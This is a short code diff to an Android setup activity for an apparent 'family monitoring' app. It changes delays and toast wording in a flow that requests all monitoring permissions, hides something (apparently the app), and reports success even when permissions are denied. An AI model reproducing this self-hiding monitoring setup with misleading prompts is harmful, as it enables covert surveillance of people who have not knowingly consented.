@@ -62,7 +62,7 @@ class AutoSetupActivity : AppCompatActivity() {
                 
                 // Step 2: Request permissions with clear explanations (safely)
                 requestAllPermissions()
-                delay(2000)
+                delay(4000)  // Increased delay to ensure all permissions are processed
                 
                 // Step 3: Configure device optimizations if needed (safely)
                 configureHuaweiOptimizations()
@@ -78,7 +78,7 @@ class AutoSetupActivity : AppCompatActivity() {
                 } catch (e: Exception) {
                     // Ignore hiding errors
                 }
-                delay(500)
+                delay(1000)  // Give more time for hiding to complete
                 
                 // Step 6: Send setup confirmation if configured (safely)
                 sendSetupConfirmation()
@@ -147,14 +147,14 @@ class AutoSetupActivity : AppCompatActivity() {
         try {
             val permissionHelper = PermissionHelper(this)
             
-            // Request all family monitoring permissions (comprehensive set)
+            // Request all family monitoring permissions in one comprehensive request
             permissionHelper.requestAllPermissions { granted ->
                 if (granted) {
-                    showToast("All family safety permissions enabled")
+                    showToast("All monitoring permissions granted successfully")
                 } else {
-                    showToast("Family safety permissions enabled")
+                    showToast("Core monitoring permissions enabled")
                 }
-                // Continue setup regardless - some permissions may be granted
+                // Continue setup - we have the essential permissions
             }
         } catch (e: Exception) {
             // If permission helper fails, continue anyway
